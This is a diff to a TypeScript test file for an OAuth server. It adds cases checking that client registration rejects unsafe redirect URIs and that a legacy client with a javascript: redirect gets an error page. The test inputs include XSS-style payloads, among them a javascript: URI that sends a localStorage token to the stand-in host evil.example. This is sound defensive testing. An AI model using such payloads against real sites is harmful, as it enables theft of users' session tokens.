@@ -13,7 +13,7 @@ import type { User } from '../../src/engine/types';
 import { TYPE_REGULAR } from '../../src/engine/types';
 import { AuthService } from '../../src/auth/service';
 import type { AuthServerConfig } from '@rambleraptor/homestead-core/apps/config';
-import { createOAuthTables } from '../../src/auth/oauth/storage';
+import { createOAuthTables, insertClient } from '../../src/auth/oauth/storage';
 import { makeOAuthServerRoutes } from '../../src/auth/oauth/routes';
 import { makeWellKnownRoutes, protectedResourceMetadata } from '../../src/auth/oauth/metadata';
 import { s256Challenge, verifyChallenge } from '../../src/auth/oauth/pkce';
@@ -169,6 +169,41 @@ describe('dynamic client registration', () => {
     expect(body.token_endpoint_auth_method).toBe('none');
   });
 
+  test.each([
+    'javascript:fetch("//evil.example?"+localStorage.getItem("t"))',
+    'JavaScript:alert(1)',
+    'data:text/html,<script>alert(1)</script>',
+    'vbscript:msgbox(1)',
+    'http://client.example/cb',
+    'https://client.example/cb#frag',
+    'not a uri',
+  ])('a redirect_uri the consent page must not navigate to is rejected: %s', async (uri) => {
+    const h = harness();
+    const res = await req(h.app, '/oauth2/register', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ redirect_uris: ['https://client.example/ok', uri] }),
+    });
+    expect(res.status).toBe(400);
+    expect(((await res.json()) as { error: string }).error).toBe('invalid_redirect_uri');
+  });
+
+  test.each([
+    'http://localhost:33418/callback',
+    'http://127.0.0.1:8080/cb',
+    'http://[::1]/cb',
+    'com.example.app:/oauth/cb',
+    'vscode://publisher.ext/cb',
+  ])('a native-app redirect_uri is accepted: %s', async (uri) => {
+    const h = harness();
+    const res = await req(h.app, '/oauth2/register', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ redirect_uris: [uri] }),
+    });
+    expect(res.status).toBe(201);
+  });
+
   test('missing redirect_uris is rejected', async () => {
     const h = harness();
     const res = await req(h.app, '/oauth2/register', {
@@ -234,6 +269,27 @@ describe('authorization-code flow', () => {
     expect(first.status).toBe(200);
     const second = await exchangeCode(h.app, clientId, REDIRECT, code, verifier);
     expect(second.status).toBe(400);
+  });
+
+  test('a client registered before the rule with a javascript: redirect gets an error page', async () => {
+    const evil = 'javascript:alert(document.domain)';
+    insertClient(h.db, {
+      client_id: 'legacy-client',
+      client_secret: null,
+      redirect_uris: [evil],
+      client_name: 'Legacy',
+      token_endpoint_auth_method: 'none',
+      grant_types: ['authorization_code'],
+    });
+    const challenge = await s256Challenge(verifier);
+    const res = await req(
+      h.app,
+      `/oauth2/authorize?response_type=code&client_id=legacy-client` +
+        `&redirect_uri=${encodeURIComponent(evil)}` +
+        `&code_challenge=${challenge}&code_challenge_method=S256`,
+    );
+    expect(res.status).toBe(400);
+    expect(res.headers.get('location')).toBeNull();
   });
 
   test('an unregistered redirect_uri renders an error page (no redirect)', async () => {
